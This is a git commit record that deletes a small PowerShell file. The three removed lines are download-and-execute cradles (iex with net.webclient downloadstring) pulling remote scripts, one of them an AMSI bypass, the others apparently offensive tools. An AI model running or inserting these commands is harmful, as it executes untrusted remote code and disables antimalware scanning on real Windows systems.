09adf8f7f7439d58d80986e69ab68a00cdfa4051
Rob <61951374+Leo4j@users.noreply.github.com>
2023-02-03 11:52:40 +0000

    Delete iex_tools.ps1

--- iex_tools.ps1
+++
@@ -1,3 +0,0 @@
-iex(new-object net.webclient).downloadstring("https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1")
-iex(new-object net.webclient).downloadstring("https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Ribes.ps1")
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Patagonia.ps1')
